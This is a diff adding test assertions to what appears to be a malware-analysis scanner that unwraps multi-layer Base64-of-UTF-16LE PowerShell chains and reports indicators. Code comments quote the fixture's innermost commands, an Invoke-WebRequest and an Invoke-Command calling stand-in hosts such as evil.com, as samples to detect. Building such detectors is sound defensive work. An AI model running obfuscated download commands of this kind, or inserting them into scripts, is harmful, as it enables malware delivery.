@@ -219,6 +219,30 @@ test('scan: 3-layer Base64-of-UTF-16LE PowerShell chain unwraps fully', async ()
   assert.ok(totalDepth >= 3,
     `recursion depth should be >= 3, got ${totalDepth} (innerFindings tree)`);
 
+  // Chain monotonicity: every descendant's chain MUST be strictly longer
+  // than its parent's. Previously the chain-prepend loop only mutated
+  // direct children, so grandchildren capped at a 3-element chain
+  // [parent, self, classifier] no matter how deep — visually capping the
+  // sidebar's "N layers" badge at 2.
+  function assertChainGrows(f, parentLen, path) {
+    assert.ok(Array.isArray(f.chain) && f.chain.length > parentLen,
+      `chain.length must grow at every recursion step. ` +
+      `at ${path}: parent had ${parentLen}, child has ${(f.chain || []).length} (${JSON.stringify(f.chain)})`);
+    if (Array.isArray(f.innerFindings)) {
+      for (let i = 0; i < f.innerFindings.length; i++) {
+        assertChainGrows(f.innerFindings[i], f.chain.length, `${path}.innerFindings[${i}]`);
+      }
+    }
+  }
+  // `root` is a top-level finding with no parent prefix — its own chain
+  // is the baseline (length=2: [encoding, classification]). Each child
+  // must add at least one element.
+  if (Array.isArray(root.innerFindings)) {
+    for (let i = 0; i < root.innerFindings.length; i++) {
+      assertChainGrows(root.innerFindings[i], root.chain.length, `root.innerFindings[${i}]`);
+    }
+  }
+
   // Walk to the deepest leaf and confirm it also classifies as
   // PowerShell (UTF-16LE) — proves the broadened TEXT_SIGNATURE catches
   // the cmdlet-only innermost layer too (`Invoke-WebRequest -Uri ...`).
@@ -228,6 +252,12 @@ test('scan: 3-layer Base64-of-UTF-16LE PowerShell chain unwraps fully', async ()
   }
   assert.equal(leaf.classification && leaf.classification.type, 'PowerShell (UTF-16LE)',
     `innermost layer should classify as PowerShell (UTF-16LE), got ${JSON.stringify(leaf.classification)}`);
+
+  // The deepest leaf should have a chain reflecting every ancestor encoding
+  // hop plus its own classifier. With 3 nested Base64 layers, leaf.chain
+  // must be at least [Base64, Base64, Base64, classifier] = 4 elements.
+  assert.ok(leaf.chain.length >= 4,
+    `leaf.chain must reflect every ancestor encoding hop, got ${JSON.stringify(leaf.chain)} (length ${leaf.chain.length})`);
 
   // The innermost `Invoke-WebRequest -Uri http://evil.example.com/...`
   // line surfaces a URL IOC. `_propagateInnerFindings` should bubble it
@@ -326,6 +356,20 @@ test('scan: examples/windows-scripts/recursive-powershell.ps1 unwraps deeply', a
   // ordering bugs are fixed).
   assert.ok(totalDepth >= 3,
     `recursion depth should be >= 3 on real fixture, got ${totalDepth}`);
+
+  // Walk to the deepest leaf and confirm its `chain` reflects EVERY
+  // ancestor encoding hop, not just its parent. Pre-fix this capped at
+  // 3 elements ([parent, self, classifier]) regardless of nesting depth
+  // because the chain-prepend loop only walked direct children. The
+  // recursive prepend ensures chain.length grows monotonically with
+  // recursion depth, terminating with a (depth+1)-element chain at the
+  // deepest leaf (every Base64 hop plus the leaf classifier).
+  let leaf = root;
+  while (leaf.innerFindings && leaf.innerFindings.length > 0) {
+    leaf = leaf.innerFindings[0];
+  }
+  assert.ok(leaf.chain.length >= 5,
+    `deepest leaf chain must reflect every ancestor hop on real fixture, got ${JSON.stringify(leaf.chain)} (length ${leaf.chain.length})`);
 
   // The innermost layer is `Invoke-Command ... https://evil.com?payload=1234`
   // (or similar). Walk to the deepest leaf via the first inner-finding chain
